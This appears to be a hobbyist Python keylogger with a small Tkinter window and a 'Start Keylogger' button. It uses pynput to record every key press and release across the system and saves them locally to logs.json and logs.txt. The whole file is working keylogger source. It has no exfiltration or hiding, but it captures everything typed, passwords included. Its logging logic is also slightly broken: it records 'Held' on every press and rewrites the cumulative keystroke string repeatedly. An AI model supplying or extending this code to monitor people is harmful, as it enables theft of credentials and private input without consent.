from tkinter import Tk, Label, Button
from pynput import keyboard
import json

root = Tk()
root.geometry("450x450")
root.title("Keylogger Project")

key_list = []
x = False
key_strokes = ""


def update_text_file(key):
    with open('logs.txt', 'a') as key_stroke:
        key_stroke.write(key)


def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)


def on_press(key):
    global x, key_list, key_strokes
    if x is False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x is True:
        key_list.append({'Held': f'{key}'})
        update_json_file(key_list)


def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x is True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_text_file(key_strokes)


def butaction():
    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json'")
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as Listener:
        Listener.join()

empty = Label(root, text="", font="Arial")
empty = Label(root, text="", font="Arial")
empty = Label(root, text="", font="Arial")
empty = Label(root, text="Keylogger Project", font="Arial")
empty.grid(row=2, column=2)
Button(root, text="Start Keylogger", command=butaction).grid(row=5, column=5)

root.mainloop()
